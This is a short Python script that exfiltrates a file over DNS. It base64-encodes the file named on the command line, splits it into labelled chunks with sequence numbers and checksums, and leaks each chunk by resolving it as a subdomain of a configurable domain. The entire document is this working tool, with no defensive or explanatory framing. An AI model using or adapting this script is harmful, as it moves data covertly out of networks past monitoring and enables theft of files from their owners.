import socket
import base64
import binascii
import sys

SLD = ""

filename = sys.argv[1]

# Read file and convert to URL-Safe characters
data = open(filename, 'rb').read()
data = base64.urlsafe_b64encode(data)
data = data.replace('_', '.').replace('=', '')

# Add label separation
def add_labels(data):
    c = 63
    while c < len(data):
        data = data[:c] + '.' + data[c:]
        c += 64
    return data

print data

seq = 0
for i in range(0, len(data), 224):
    chunk = data[i:i+224]

    # Create 16 bit checksum
    checksum = binascii.crc_hqx(chunk, 0)
    # Add labels to count
    chunk = add_labels(chunk)
    payload = '%02x' % seq + '%04x' % checksum + '.' + chunk
    print(payload + SLD)
    # 253 characters is maximum length
    print(len(payload + SLD))
    result = socket.gethostbyname(payload + SLD)

    # Loop the sequence number
    seq += 1
    if seq == 256:
        seq = 0

print 'Finished sending data!'